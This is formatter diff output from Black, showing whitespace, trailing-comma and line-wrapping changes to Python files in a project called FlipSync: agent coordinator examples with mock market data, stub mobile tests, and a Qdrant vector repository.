+                                "analysis": f"Based on price and volume analysis, the recommendation is to {recommendation} with {confidence:.1f} confidence.",
                             }
                         else:
                             error = f"Symbol {symbol} not found in market {market}"
                     else:
                         error = "Symbol is required for market analysis"
                 else:
                     error = f"Market {market} not found"
             except Exception as e:
                 error = str(e)
-            
+
             # Publish task result
             if error:
                 await self.publisher.publish_notification(
                     notification_name="task_failed",
-                    data={
-                        "task_id": task_id,
-                        "error": error
-                    }
+                    data={"task_id": task_id, "error": error},
                 )
             else:
                 await self.publisher.publish_notification(
                     notification_name="task_completed",
-                    data={
-                        "task_id": task_id,
-                        "result": result
-                    }
+                    data={"task_id": task_id, "result": result},
                 )
-        
+
         else:
             # Unknown task type
             await self.publisher.publish_notification(
                 notification_name="task_failed",
-                data={
-                    "task_id": task_id,
-                    "error": f"Unknown task type: {task_type}"
-                }
+                data={"task_id": task_id, "error": f"Unknown task type: {task_type}"},
             )
 
 
 class ExecutiveAgent:
     """
     Agent that makes executive decisions based on market data.
     """
-    
+
     def __init__(self):
         """Initialize the executive agent."""
         self.agent_id = "executive_agent"
         self.name = "Executive Agent"
         self.description = "Makes executive decisions based on market data"
         self.agent_type = AgentType.EXECUTIVE
-        
+
         # Create publisher and subscriber
         self.publisher = create_publisher(source_id=self.agent_id)
         self.subscriber = create_subscriber(subscriber_id=self.agent_id)
-        
+
         # Define capabilities
         self.capabilities = [
             AgentCapability(
                 name="investment_decision",
                 description="Makes investment decisions based on market data",
                 parameters={"market": "string", "symbol": "string"},
-                tags={"investment", "decision", "finance"}
+                tags={"investment", "decision", "finance"},
             )
         ]
-    
+
     async def start(self, coordinator):
         """
         Start the executive agent.
-        
+
         Args:
             coordinator: The coordinator to register with
         """
         logger.info(f"Starting {self.name}")
-        
+
         # Register with the coordinator
         agent_info = AgentInfo(
             agent_id=self.agent_id,
             agent_type=self.agent_type,
             name=self.name,
             description=self.description,
-            capabilities=self.capabilities
-        )
-        
+            capabilities=self.capabilities,
+        )
+
         await coordinator.register_agent(agent_info)
-        
+
         # Store the coordinator for later use
         self.coordinator = coordinator
-        
+
         logger.info(f"{self.name} started")
-    
+
     async def make_investment_decision(self, market, symbol):
         """
         Make an investment decision based on market data and analysis.
-        
+
         Args:
             market: The market to analyze
             symbol: The symbol to analyze
-            
+
         Returns:
             The investment decision
         """
         logger.info(f"{self.name} making investment decision for {market}/{symbol}")
-        
+
         # First, get market data
         market_data_capability = AgentCapability(
-            name="market_data",
-            parameters={"market": market, "symbol": symbol}
-        )
-        
+            name="market_data", parameters={"market": market, "symbol": symbol}
+        )
+
         # Find agents with market data capability
-        market_data_agents = await self.coordinator.find_agents_by_capability(market_data_capability)
-        
+        market_data_agents = await self.coordinator.find_agents_by_capability(
+            market_data_capability
+        )
+
         if not market_data_agents:
-            logger.error(f"No agents found with market_data capability for {market}/{symbol}")
+            logger.error(
+                f"No agents found with market_data capability for {market}/{symbol}"
+            )
             return None
-        
+
         # Delegate task to get market data
         market_data_task_id = await self.coordinator.delegate_task(
             task_id="",
             task_type="get_market_data",
             parameters={"market": market, "symbol": symbol},
             required_capability=market_data_capability,
-            priority=TaskPriority.HIGH.value
-        )
-        
+            priority=TaskPriority.HIGH.value,
+        )
+
         # Wait for the task to complete
         while True:
             task_status = await self.coordinator.get_task_status(market_data_task_id)
             if task_status["status"] in ("completed", "failed"):
                 break
             await asyncio.sleep(0.1)
-        
+
         if task_status["status"] == "failed":
             logger.error(f"Failed to get market data for {market}/{symbol}")
             return None
-        
+
         # Get the market data result
         market_data_result = await self.coordinator.get_task_result(market_data_task_id)
         market_data = market_data_result["result"]
-        
+
         # Next, get market analysis
         market_analysis_capability = AgentCapability(
-            name="market_analysis",
-            parameters={"market": market, "symbol": symbol}
-        )
-        
+            name="market_analysis", parameters={"market": market, "symbol": symbol}
+        )
+
         # Find agents with market analysis capability
-        market_analysis_agents = await self.coordinator.find_agents_by_capability(market_analysis_capability)
-        
+        market_analysis_agents = await self.coordinator.find_agents_by_capability(
+            market_analysis_capability
+        )
+
         if not market_analysis_agents:
-            logger.error(f"No agents found with market_analysis capability for {market}/{symbol}")
+            logger.error(
+                f"No agents found with market_analysis capability for {market}/{symbol}"
+            )
             return None
-        
+
         # Delegate task to analyze market
         market_analysis_task_id = await self.coordinator.delegate_task(
             task_id="",
             task_type="analyze_market",
             parameters={"market": market, "symbol": symbol},
             required_capability=market_analysis_capability,
-            priority=TaskPriority.HIGH.value
-        )
-        
+            priority=TaskPriority.HIGH.value,
+        )
+
         # Wait for the task to complete
         while True:
-            task_status = await self.coordinator.get_task_status(market_analysis_task_id)
+            task_status = await self.coordinator.get_task_status(
+                market_analysis_task_id
+            )
             if task_status["status"] in ("completed", "failed"):
                 break
             await asyncio.sleep(0.1)
-        
+
         if task_status["status"] == "failed":
             logger.error(f"Failed to analyze market for {market}/{symbol}")
             return None
-        
+
         # Get the market analysis result
-        market_analysis_result = await self.coordinator.get_task_result(market_analysis_task_id)
+        market_analysis_result = await self.coordinator.get_task_result(
+            market_analysis_task_id
+        )
         market_analysis = market_analysis_result["result"]
-        
+
         # Make the investment decision
         decision = {
             "market": market,
             "symbol": symbol,
             "price": market_data["price"],
             "volume": market_data["volume"],
             "recommendation": market_analysis["recommendation"],
             "confidence": market_analysis["confidence"],
             "analysis": market_analysis["analysis"],
-            "decision_time": datetime.now().isoformat()
+            "decision_time": datetime.now().isoformat(),
         }
-        
+
         logger.info(
             f"{self.name} decided to {decision['recommendation']} {market}/{symbol} "
             f"with confidence {decision['confidence']}"
         )
-        
+
         # Publish the decision
         await self.publisher.publish_notification(
-            notification_name="investment_decision",
-            data=decision
-        )
-        
+            notification_name="investment_decision", data=decision
+        )
+
         return decision
 
 
 async def main():
     """Main function."""
     # Create and set the event bus
     event_bus = InMemoryEventBus(bus_id="example_bus")
     set_event_bus(event_bus)
-    
+
     # Create the coordinator
     coordinator = InMemoryCoordinator(coordinator_id="example_coordinator")
     await coordinator.start()
-    
+
     # Create agents
     market_agent = MarketAgent()
     executive_agent = ExecutiveAgent()
-    
+
     # Start agents
     await market_agent.start(coordinator)
     await executive_agent.start(coordinator)
-    
+
     # Make some investment decisions
     await executive_agent.make_investment_decision("crypto", "bitcoin")
     await executive_agent.make_investment_decision("stocks", "aapl")
-    
+
     # Try a non-existent market/symbol
     await executive_agent.make_investment_decision("forex", "usd_eur")
-    
+
     # Stop the coordinator
     await coordinator.stop()
 
 
 if __name__ == "__main__":
would reformat /home/brend/Flipsync_Final/fs_agt_clean/examples/coordinator_example.py
--- /home/brend/Flipsync_Final/fs_agt_clean/examples/knowledge_repository_example.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/examples/knowledge_repository_example.py	2025-06-19 04:04:01.687205+00:00
@@ -12,28 +12,40 @@
 from typing import Any, Dict, List, Optional, Set, Tuple
 
 import numpy as np
 
 from fs_agt_clean.core.coordination.event_system import (
-    Event, EventType, EventPriority, InMemoryEventBus, set_event_bus,
-    create_publisher, create_subscriber, EventNameFilter
+    Event,
+    EventType,
+    EventPriority,
+    InMemoryEventBus,
+    set_event_bus,
+    create_publisher,
+    create_subscriber,
+    EventNameFilter,
 )
 from fs_agt_clean.core.coordination.knowledge_repository import (
-    KnowledgeItem, KnowledgeType, KnowledgeStatus, KnowledgeError,
-    VectorStorage, InMemoryVectorStorage,
-    EmbeddingProvider, SimpleEmbeddingProvider,
-    KnowledgeValidator, SchemaValidator,
-    KnowledgeCache, LRUCache,
+    KnowledgeItem,
+    KnowledgeType,
+    KnowledgeStatus,
+    KnowledgeError,
+    VectorStorage,
+    InMemoryVectorStorage,
+    EmbeddingProvider,
+    SimpleEmbeddingProvider,
+    KnowledgeValidator,
+    SchemaValidator,
+    KnowledgeCache,
+    LRUCache,
     TopicFilter,
-    InMemoryKnowledgeRepository
+    InMemoryKnowledgeRepository,
 )
 
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
+    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger("knowledge_repository_example")
 
 
 class MarketKnowledgeAgent:
@@ -53,17 +65,17 @@
         # Market data
         self.market_data = {
             "crypto": {
                 "bitcoin": {"price": 50000, "volume": 1000000},
                 "ethereum": {"price": 3000, "volume": 500000},
-                "dogecoin": {"price": 0.5, "volume": 2000000}
+                "dogecoin": {"price": 0.5, "volume": 2000000},
             },
             "stocks": {
                 "aapl": {"price": 150, "volume": 5000000},
                 "msft": {"price": 300, "volume": 3000000},
-                "googl": {"price": 2500, "volume": 1000000}
-            }
+                "googl": {"price": 2500, "volume": 1000000},
+            },
         }
 
     async def start(self, repository):
         """
         Start the market knowledge agent.
@@ -77,11 +89,11 @@
         self.repository = repository
 
         # Subscribe to knowledge query events
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_query"}),
-            handler=self.handle_knowledge_query
+            handler=self.handle_knowledge_query,
         )
 
         # Publish initial market knowledge
         await self.publish_market_knowledge()
 
@@ -96,14 +108,14 @@
                 topic=f"market/crypto/{symbol}",
                 content=data,
                 metadata={
                     "market": "crypto",
                     "symbol": symbol,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 },
                 source_id=self.agent_id,
-                tags={"market", "crypto", symbol}
+                tags={"market", "crypto", symbol},
             )
 
         # Publish stock market knowledge
         for symbol, data in self.market_data["stocks"].items():
             await self.repository.publish_knowledge(
@@ -111,14 +123,14 @@
                 topic=f"market/stocks/{symbol}",
                 content=data,
                 metadata={
                     "market": "stocks",
                     "symbol": symbol,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 },
                 source_id=self.agent_id,
-                tags={"market", "stocks", symbol}
+                tags={"market", "stocks", symbol},
             )
 
         logger.info("Published market knowledge")
 
     async def handle_knowledge_query(self, event):
@@ -162,17 +174,17 @@
         self.repository = repository
 
         # Subscribe to knowledge added events
         await self.subscriber.subscribe(
             filter=EventNameFilter(event_names={"knowledge_added"}),
-            handler=self.handle_knowledge_added
+            handler=self.handle_knowledge_added,
         )
 
         # Subscribe to market knowledge
         await self.repository.subscribe(
             filter=TopicFilter(topics={"market/crypto/bitcoin", "market/stocks/aapl"}),
-            handler=self.handle_market_knowledge
+            handler=self.handle_market_knowledge,
         )
 
         logger.info(f"{self.name} started")
 
     async def handle_knowledge_added(self, event):
@@ -227,21 +239,23 @@
                 content={
                     "recommendation": recommendation,
                     "confidence": confidence,
                     "price": price,
                     "volume": volume,
-                    "analysis": f"Based on price and volume analysis, the recommendation is to {recommendation} with {confidence:.1f} confidence."
+                    "analysis": f"Based on price and volume analysis, the recommendation is to {recommendation} with {confidence:.1f} confidence.",
                 },
                 metadata={
                     "source_knowledge_id": knowledge.knowledge_id,
-                    "timestamp": datetime.now().isoformat()
+                    "timestamp": datetime.now().isoformat(),
                 },
                 source_id=self.agent_id,
-                tags={"analysis", "recommendation", recommendation}
+                tags={"analysis", "recommendation", recommendation},
             )
 
-            logger.info(f"Published analysis for {knowledge.topic}: {recommendation} ({confidence:.1f})")
+            logger.info(
+                f"Published analysis for {knowledge.topic}: {recommendation} ({confidence:.1f})"
+            )
 
 
 async def main():
     """Main function."""
     # Create and set the event bus
would reformat /home/brend/Flipsync_Final/fs_agt_clean/examples/knowledge_repository_example.py
--- /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_payload_optimizer.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_payload_optimizer.py	2025-06-19 04:04:01.703400+00:00
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from payload_optimizer import *
+
 
 class TestPayloadOptimizerMobile:
     """Mobile test class for payload_optimizer."""
 
     def test_import(self):
@@ -58,7 +59,8 @@
     def test_mobile_first_vision_alignment(self):
         """Test mobile-first vision alignment requirements."""
         # TODO: Add mobile-first vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_payload_optimizer.py
--- /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_models.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_models.py	2025-06-19 04:04:01.756694+00:00
@@ -1,11 +1,11 @@
 """
 Mobile Test module for mobile_models
 
 This module contains mobile-focused tests for the migrated mobile_models component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from models import *
+
 
 class TestModelsMobile:
     """Mobile test class for models."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_mobile_first_vision_alignment(self):
         """Test mobile-first vision alignment requirements."""
         # TODO: Add mobile-first vision alignment tests
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
--- /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_state_reconciler.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_state_reconciler.py	2025-06-19 04:04:01.756440+00:00
@@ -12,50 +12,52 @@
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from state_reconciler import *
 
+
 class TestStateReconcilerStateManagement:
     """State management test class for state_reconciler."""
-    
+
     def test_import(self):
         """Test that the module can be imported."""
         # TODO: Add actual import test
         assert True
-    
+
     def test_state_persistence(self):
         """Test state persistence functionality."""
         # TODO: Add state persistence tests
         assert True
-    
+
     def test_state_loading(self):
         """Test state loading functionality."""
         # TODO: Add state loading tests
         assert True
-    
+
     def test_state_synchronization(self):
         """Test state synchronization if applicable."""
         # TODO: Add state synchronization tests
         assert True
-    
+
     def test_mobile_state_reconciliation(self):
         """Test mobile state reconciliation if applicable."""
         # TODO: Add mobile state reconciliation tests
         assert True
-    
+
     def test_cache_management(self):
         """Test cache management if applicable."""
         # TODO: Add cache management tests
         assert True
-    
+
     def test_error_handling(self):
         """Test error handling in state operations."""
         # TODO: Add error handling tests
         assert True
-    
+
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for state management
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_models.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/mobile/test_state_reconciler.py
--- /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/vector_repository.py	2025-06-14 20:35:30.811786+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/vector_repository.py	2025-06-19 04:04:01.806521+00:00
@@ -9,369 +9,406 @@
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional, Tuple
 from uuid import UUID, uuid4
 
 # Vector repository doesn't use traditional database tables
-from fs_agt_clean.core.config.vector_config import vector_db_manager, VectorCollectionType
+from fs_agt_clean.core.config.vector_config import (
+    vector_db_manager,
+    VectorCollectionType,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class VectorEmbedding:
     """Vector embedding model for database operations."""
-    
+
     def __init__(
         self,
         id: str,
         entity_id: str,
         entity_type: str,
         vector: List[float],
         metadata: Dict[str, Any],
         created_at: Optional[datetime] = None,
-        updated_at: Optional[datetime] = None
+        updated_at: Optional[datetime] = None,
     ):
         self.id = id
         self.entity_id = entity_id
         self.entity_type = entity_type
         self.vector = vector
         self.metadata = metadata
         self.created_at = created_at or datetime.now(timezone.utc)
         self.updated_at = updated_at or datetime.now(timezone.utc)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "id": self.id,
             "entity_id": self.entity_id,
             "entity_type": self.entity_type,
             "vector_dimension": len(self.vector),
             "metadata": self.metadata,
             "created_at": self.created_at.isoformat() if self.created_at else None,
-            "updated_at": self.updated_at.isoformat() if self.updated_at else None
+            "updated_at": self.updated_at.isoformat() if self.updated_at else None,
         }
 
 
 class VectorEmbeddingRepository:
     """Repository for vector embedding operations."""
 
     def __init__(self):
         """Initialize the vector embedding repository."""
         self.model_class = VectorEmbedding
-        
+
         # Collection type mapping
         self.collection_mapping = {
             "product": VectorCollectionType.PRODUCTS,
             "category": VectorCollectionType.CATEGORIES,
             "listing": VectorCollectionType.LISTINGS,
-            "market_trend": VectorCollectionType.MARKET_TRENDS
+            "market_trend": VectorCollectionType.MARKET_TRENDS,
         }
-        
+
         logger.info("Vector Embedding Repository initialized")
-    
+
     async def create_embedding(
         self,
         entity_id: str,
         entity_type: str,
         vector: List[float],
-        metadata: Dict[str, Any]
+        metadata: Dict[str, Any],
     ) -> Optional[VectorEmbedding]:
         """
         Create a new vector embedding.
-        
+
         Args:
             entity_id: ID of the entity being embedded
             entity_type: Type of entity (product, category, etc.)
             vector: Vector embedding
             metadata: Additional metadata
-            
+
         Returns:
             Created VectorEmbedding or None if failed
         """
         try:
             # Generate unique ID for the embedding
             embedding_id = str(uuid4())
-            
+
             # Create embedding object
             embedding = VectorEmbedding(
                 id=embedding_id,
                 entity_id=entity_id,
                 entity_type=entity_type,
                 vector=vector,
-                metadata=metadata
-            )
-            
+                metadata=metadata,
+            )
+
             # Store in vector database if available
             if vector_db_manager.is_available():
                 success = await self._store_in_vector_db(embedding)
                 if not success:
-                    logger.warning(f"Failed to store embedding in vector DB: {embedding_id}")
-            
+                    logger.warning(
+                        f"Failed to store embedding in vector DB: {embedding_id}"
+                    )
+
             # Store in traditional database (if implemented)
             # For now, we'll just return the embedding object
-            logger.info(f"Created vector embedding: {embedding_id} for {entity_type}:{entity_id}")
+            logger.info(
+                f"Created vector embedding: {embedding_id} for {entity_type}:{entity_id}"
+            )
             return embedding
-            
+
         except Exception as e:
             logger.error(f"Error creating vector embedding: {e}")
             return None
-    
+
     async def _store_in_vector_db(self, embedding: VectorEmbedding) -> bool:
         """Store embedding in Qdrant vector database."""
         try:
             # Get collection type
             collection_type = self.collection_mapping.get(embedding.entity_type)
             if not collection_type:
                 logger.error(f"Unknown entity type: {embedding.entity_type}")
                 return False
-            
+
             # Prepare payload
             payload = {
                 "embedding_id": embedding.id,
                 "entity_id": embedding.entity_id,
                 "entity_type": embedding.entity_type,
                 "created_at": embedding.created_at.isoformat(),
                 "updated_at": embedding.updated_at.isoformat(),
-                **embedding.metadata
+                **embedding.metadata,
             }
-            
+
             # Store in vector database
             from qdrant_client.http.models import PointStruct
-            
+
             collection_name = vector_db_manager.get_collection_name(collection_type)
-            
+
             point = PointStruct(
-                id=embedding.id,
-                vector=embedding.vector,
-                payload=payload
-            )
-            
+                id=embedding.id, vector=embedding.vector, payload=payload
+            )
+
             vector_db_manager.client.upsert(
-                collection_name=collection_name,
-                points=[point]
-            )
-            
+                collection_name=collection_name, points=[point]
+            )
+
             logger.debug(f"Stored embedding in vector DB: {embedding.id}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error storing embedding in vector DB: {e}")
             return False
-    
+
     async def get_embedding_by_id(self, embedding_id: str) -> Optional[VectorEmbedding]:
         """Get embedding by ID."""
         if not vector_db_manager.is_available():
             logger.warning("Vector database not available")
             return None
-        
+
         try:
             # Search across all collections
             for entity_type, collection_type in self.collection_mapping.items():
                 collection_name = vector_db_manager.get_collection_name(collection_type)
-                
+
                 try:
                     points = vector_db_manager.client.retrieve(
                         collection_name=collection_name,
                         ids=[embedding_id],
                         with_payload=True,
-                        with_vectors=True
+                        with_vectors=True,
                     )
-                    
+
                     if points:
                         point = points[0]
                         return VectorEmbedding(
                             id=point.id,
                             entity_id=point.payload.get("entity_id"),
                             entity_type=point.payload.get("entity_type"),
                             vector=point.vector,
-                            metadata={k: v for k, v in point.payload.items() 
-                                    if k not in ["embedding_id", "entity_id", "entity_type", "created_at", "updated_at"]},
-                            created_at=datetime.fromisoformat(point.payload.get("created_at")),
-                            updated_at=datetime.fromisoformat(point.payload.get("updated_at"))
+                            metadata={
+                                k: v
+                                for k, v in point.payload.items()
+                                if k
+                                not in [
+                                    "embedding_id",
+                                    "entity_id",
+                                    "entity_type",
+                                    "created_at",
+                                    "updated_at",
+                                ]
+                            },
+                            created_at=datetime.fromisoformat(
+                                point.payload.get("created_at")
+                            ),
+                            updated_at=datetime.fromisoformat(
+                                point.payload.get("updated_at")
+                            ),
                         )
                 except Exception:
                     continue
-            
+
             logger.warning(f"Embedding not found: {embedding_id}")
             return None
-            
+
         except Exception as e:
             logger.error(f"Error retrieving embedding: {e}")
             return None
-    
+
     async def get_embeddings_by_entity(
-        self,
-        entity_id: str,
-        entity_type: str
+        self, entity_id: str, entity_type: str
     ) -> List[VectorEmbedding]:
         """Get all embeddings for a specific entity."""
         if not vector_db_manager.is_available():
             logger.warning("Vector database not available")
             return []
-        
+
         try:
             collection_type = self.collection_mapping.get(entity_type)
             if not collection_type:
                 logger.error(f"Unknown entity type: {entity_type}")
                 return []
-            
+
             collection_name = vector_db_manager.get_collection_name(collection_type)
-            
+
             # Search with filter
             search_results = vector_db_manager.client.scroll(
                 collection_name=collection_name,
                 scroll_filter={
-                    "must": [
-                        {"key": "entity_id", "match": {"value": entity_id}}
-                    ]
+                    "must": [{"key": "entity_id", "match": {"value": entity_id}}]
                 },
                 with_payload=True,
-                with_vectors=True
-            )
-            
+                with_vectors=True,
+            )
+
             embeddings = []
             for point in search_results[0]:  # scroll returns (points, next_page_offset)
                 embedding = VectorEmbedding(
                     id=point.id,
                     entity_id=point.payload.get("entity_id"),
                     entity_type=point.payload.get("entity_type"),
                     vector=point.vector,
-                    metadata={k: v for k, v in point.payload.items() 
-                            if k not in ["embedding_id", "entity_id", "entity_type", "created_at", "updated_at"]},
+                    metadata={
+                        k: v
+                        for k, v in point.payload.items()
+                        if k
+                        not in [
+                            "embedding_id",
+                            "entity_id",
+                            "entity_type",
+                            "created_at",
+                            "updated_at",
+                        ]
+                    },
                     created_at=datetime.fromisoformat(point.payload.get("created_at")),
-                    updated_at=datetime.fromisoformat(point.payload.get("updated_at"))
+                    updated_at=datetime.fromisoformat(point.payload.get("updated_at")),
                 )
                 embeddings.append(embedding)
-            
-            logger.info(f"Found {len(embeddings)} embeddings for {entity_type}:{entity_id}")
+
+            logger.info(
+                f"Found {len(embeddings)} embeddings for {entity_type}:{entity_id}"
+            )
             return embeddings
-            
+
         except Exception as e:
             logger.error(f"Error retrieving embeddings for entity: {e}")
             return []
-    
+
     async def search_similar_embeddings(
         self,
         query_vector: List[float],
         entity_type: str,
         limit: int = 10,
         score_threshold: float = 0.7,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Tuple[VectorEmbedding, float]]:
         """
         Search for similar embeddings.
-        
+
         Args:
             query_vector: Query vector
             entity_type: Type of entities to search
             limit: Maximum number of results
             score_threshold: Minimum similarity score
             filters: Optional filters
-            
+
         Returns:
             List of (embedding, score) tuples
         """
         if not vector_db_manager.is_available():
             logger.warning("Vector database not available")
             return []
-        
+
         try:
             collection_type = self.collection_mapping.get(entity_type)
             if not collection_type:
                 logger.error(f"Unknown entity type: {entity_type}")
                 return []
-            
+
             collection_name = vector_db_manager.get_collection_name(collection_type)
-            
+
             # Perform similarity search
             search_results = vector_db_manager.client.search(
                 collection_name=collection_name,
                 query_vector=query_vector,
                 limit=limit,
                 score_threshold=score_threshold,
                 query_filter=filters,
                 with_payload=True,
-                with_vectors=True
-            )
-            
+                with_vectors=True,
+            )
+
             results = []
             for result in search_results:
                 embedding = VectorEmbedding(
                     id=result.id,
                     entity_id=result.payload.get("entity_id"),
                     entity_type=result.payload.get("entity_type"),
                     vector=result.vector,
-                    metadata={k: v for k, v in result.payload.items() 
-                            if k not in ["embedding_id", "entity_id", "entity_type", "created_at", "updated_at"]},
+                    metadata={
+                        k: v
+                        for k, v in result.payload.items()
+                        if k
+                        not in [
+                            "embedding_id",
+                            "entity_id",
+                            "entity_type",
+                            "created_at",
+                            "updated_at",
+                        ]
+                    },
                     created_at=datetime.fromisoformat(result.payload.get("created_at")),
-                    updated_at=datetime.fromisoformat(result.payload.get("updated_at"))
+                    updated_at=datetime.fromisoformat(result.payload.get("updated_at")),
                 )
                 results.append((embedding, result.score))
-            
+
             logger.info(f"Found {len(results)} similar embeddings for {entity_type}")
             return results
-            
+
         except Exception as e:
             logger.error(f"Error searching similar embeddings: {e}")
             return []
-    
+
     async def delete_embedding(self, embedding_id: str) -> bool:
         """Delete an embedding by ID."""
         if not vector_db_manager.is_available():
             logger.warning("Vector database not available")
             return False
-        
+
         try:
             # Delete from all collections (since we don't know which one)
             deleted = False
             for entity_type, collection_type in self.collection_mapping.items():
                 collection_name = vector_db_manager.get_collection_name(collection_type)
-                
+
                 try:
                     vector_db_manager.client.delete(
-                        collection_name=collection_name,
-                        points_selector=[embedding_id]
+                        collection_name=collection_name, points_selector=[embedding_id]
                     )
                     deleted = True
                     logger.info(f"Deleted embedding: {embedding_id}")
                     break
                 except Exception:
                     continue
-            
+
             return deleted
-            
+
         except Exception as e:
             logger.error(f"Error deleting embedding: {e}")
             return False
-    
+
     async def get_collection_stats(self) -> Dict[str, Any]:
         """Get statistics for all vector collections."""
         if not vector_db_manager.is_available():
             return {"error": "Vector database not available"}
-        
+
         try:
             stats = {}
-            
+
             for entity_type, collection_type in self.collection_mapping.items():
                 collection_name = vector_db_manager.get_collection_name(collection_type)
-                
+
                 try:
-                    collection_info = vector_db_manager.client.get_collection(collection_name)
+                    collection_info = vector_db_manager.client.get_collection(
+                        collection_name
+                    )
                     stats[entity_type] = {
                         "collection_name": collection_name,
                         "vectors_count": collection_info.vectors_count,
                         "points_count": collection_info.points_count,
-                        "status": "healthy"
+                        "status": "healthy",
                     }
                 except Exception as e:
                     stats[entity_type] = {
                         "collection_name": collection_name,
                         "status": "error",
-                        "error": str(e)
+                        "error": str(e),
                     }
-            
+
             return stats
-            
+
         except Exception as e:
             logger.error(f"Error getting collection stats: {e}")
             return {"error": str(e)}
 
 
--- /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/ai_integration/brain/__init__.py	2025-06-14 20:35:30.815795+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/ai_integration/brain/__init__.py	2025-06-19 04:04:01.812003+00:00
@@ -1,8 +1,12 @@
 """Brain module for the FlipSync agent system."""
 
-from fs_agt_clean.core.agent_coordination import AgentOrchestrator, Workflow, WorkflowState
+from fs_agt_clean.core.agent_coordination import (
+    AgentOrchestrator,
+    Workflow,
+    WorkflowState,
+)
 from fs_agt_clean.core.brain.decision import Decision, DecisionEngine
 from fs_agt_clean.core.brain.strategy.models import Strategy, StrategyResult
 from fs_agt_clean.core.brain.workflow_engine import WorkflowEngine
 
 # Import at runtime to avoid circular import
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/ai_integration/brain/__init__.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/database/repositories/vector_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/ai_integration/brain/patterns/__init__.py	2025-06-14 20:35:30.815795+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/ai_integration/brain/patterns/__init__.py	2025-06-19 04:04:01.963871+00:00
@@ -1,5 +1,8 @@
 """Pattern recognition module initialization."""
 
-from fs_agt_clean.core.brain.patterns.market_patterns import MarketPatternRecognizer, Pattern
+from fs_agt_clean.core.brain.patterns.market_patterns import (
+    MarketPatternRecognizer,
+    Pattern,
+)
 
 __all__ = ["Pattern", "MarketPatternRecognizer"]
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/advanced_features/ai_integration/brain/patterns/__init__.py
--- /home/brend/Flipsync_Final/fs_agt_clean/mobile/mobile_service_coordinator.py	2025-06-16 15:11:25.786850+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/mobile/mobile_service_coordinator.py	2025-06-19 04:04:02.090689+00:00
@@ -12,54 +12,61 @@
 import asyncio
 import logging
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional
 
-from fs_agt_clean.mobile.battery_optimizer import BatteryOptimizer, BatteryMetrics, PowerMode
+from fs_agt_clean.mobile.battery_optimizer import (
+    BatteryOptimizer,
+    BatteryMetrics,
+    PowerMode,
+)
 from fs_agt_clean.mobile.models import Account
 from fs_agt_clean.mobile.payload_optimizer import MobilePayloadOptimizer
 from fs_agt_clean.mobile.state_reconciler import MobileStateReconciler
-from fs_agt_clean.mobile.update_prioritizer import MarketUpdatePrioritizer, UpdatePriority
+from fs_agt_clean.mobile.update_prioritizer import (
+    MarketUpdatePrioritizer,
+    UpdatePriority,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class MobileServiceCoordinator:
     """Coordinates mobile backend services for Flutter frontend integration."""
 
     def __init__(self, config: Optional[Dict[str, Any]] = None):
         """Initialize the mobile service coordinator."""
         self.config = config or {}
-        
+
         # Initialize mobile services
         self.battery_optimizer = BatteryOptimizer()
         self.payload_optimizer = MobilePayloadOptimizer()
         self.state_reconciler = MobileStateReconciler()
         self.update_prioritizer = MarketUpdatePrioritizer(
             battery_optimizer=self.battery_optimizer,
             max_retry_count=self.config.get("max_retry_count", 3),
-            expiry_threshold_seconds=self.config.get("expiry_threshold", 3600)
+            expiry_threshold_seconds=self.config.get("expiry_threshold", 3600),
         )
-        
+
         # Service state
         self.is_initialized = False
         self._sync_task: Optional[asyncio.Task] = None
 
